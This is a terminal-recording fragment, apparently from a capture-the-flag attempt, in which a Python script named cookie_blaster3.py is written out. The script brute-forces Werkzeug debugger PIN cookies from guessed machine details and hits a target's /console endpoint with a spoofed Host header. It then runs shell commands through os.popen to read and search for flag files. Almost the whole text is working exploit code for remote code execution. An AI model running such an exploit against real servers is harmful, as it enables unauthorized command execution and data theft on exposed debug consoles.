[1475.748282, "i", "cat << 'EOF' > cookie_blaster3.py\nimport hashlib, requests\nfrom itertools import chain\nimport concurrent.futures\n\nboot_id = 'df37f78a-cf41-4eae-9e39-a834a92a596a'\nmac = '2485377892356'\n\nusernames = ['root', 'app', 'www-data', 'nobody', 'admin', 'ctf', 'werkzeug', 'daemon']\nmodnames = ['flask.app', 'werkzeug.debug', '__main__', 'app', 'server', 'application', 'run']\nappnames = ['Flask', 'DebuggedApplication', 'wsgi_app', 'app', 'application']\n\nbase_paths = [\n    '/usr/local/lib/pythonx/site-packages/flask/app.py',\n    '/usr/local/lib/pythonx/dist-packages/flask/app.py',\n    '/usr/lib/pythonx/site-packages/flask/app.py',\n    '/usr/lib/pythonx/dist-packages/flask/app.py',\n    '/usr/lib/python3/dist-packages/flask/app.py',\n    '/usr/local/lib/pythonx/site-packages/werkzeug/debug/__init__.py',\n    '/usr/lib/pythonx/site-packages/werkzeug/debug/__init__.py',\n    '/usr/lib/python3/dist-packages/werkzeug/debug/__init__.py'\n]\n\npaths = ['/app/app.py', '/app/main.py', '/app/server.py', '/app/run.py', '/app/__init__.py']\nfor x in ['3.11', '3.12', '3.10', '3.9']:\n    for p in base_paths:\n        paths.append(p.replace('pythonx', 'python' + x))\n\nmachine_ids = [boot_id, boot_id + '0::/']\n\ncookies = {}\n\nfor u in usernames:\n    for m1 in modnames:\n        for m2 in appnames:\n            for m3 in paths:\n                for mid in machine_ids:\n                    for hash_algo in ['sha1', 'sha256', 'md5']:\n                        h = hashlib.new(hash_algo)\n                        try:\n                            for bit in chain([u, m1, m2, m3], [mac, mid]):\n                                if not bit: continue\n                                if isinstance(bit, str): bit = bit.encode('utf-8')\n                                h.update(bit)\n                            h.update(b'cookiesalt')\n                            cookie_name = f\"__wzd{h.hexdigest()[:20]}\"\n                            h.update(b'pinsalt')\n                            num = f\"{int(h.hexdigest(),  16):09d}\"[:9]\n                            pin = f\"{num[:3]}-{num[3:6]}-{num[6:9]}\"\n                            \n                            cval_hash = hashlib.sha1(f\"{pin} pallets\".encode('utf-8')).hexdigest()\n                            cookies[cookie_name] = cval_hash\n                        except Exception:\n                            pass\n\nprint(f\"Total cookies: {len(cookies)}\")\n\ncookie_items = list(cookies.items())\nchunk_size = 50\nchunks = [dict(cookie_items[i:i+chunk_size]) for i in range(0, len(cookie_items), chunk_size)]\n\nurl = \"http://target:8127/console\"\nsecret = \"cROx4oCXXz5PA5qlhIU3\"\n\ndef test_chunk(chunk):\n    r = requests.get(url, params={\"__debugger__\": \"yes\", \"cmd\": \"print('PWNED_1337')\", \"frm\": \"0\", \"s\": secret}, headers={\"Host\": \"localhost\"}, cookies=chunk)\n    if 'PWNED_1337' in r.text and r.status_code == 200:\n        for k, v in chunk.items():\n            r2 = requests.get(url, params={\"__debugger__\": \"yes\", \"cmd\": \"print('WINNER_99')\", \"frm\": \"0\", \"s\": secret}, headers={\"Host\": \"localhost\"}, cookies={k: v})\n            if 'WINNER_99' in r2.text:\n                print(f\"\\n[!] EXPLOITED VIA COOKIE: {k}={v}\")\n                cmd = \"import os; print('=== FLAG ==='); print(os.popen('cat /flag.txt 2>/dev/null; cat /app/flags.txt 2>/dev/null; find / -name \\\"*flag*\\\" -not -path \\\"*/proc/*\\\" 2>/dev/null | xargs -r cat').read())\"\n                r3 = requests.get(url, params={\"__debugger__\": \"yes\", \"cmd\": cmd, \"frm\": \"0\", \"s\": secret}, headers={\"Host\": \"localhost\"}, cookies={k: v})\n                print(r3.text)\n                return True\n    return False\n\nwith concurrent.futures.ThreadPoolExecutor(max_workers=25) as ex:\n    for res in ex.map(test_chunk, chunks):\n        pass\nEOF\n"]
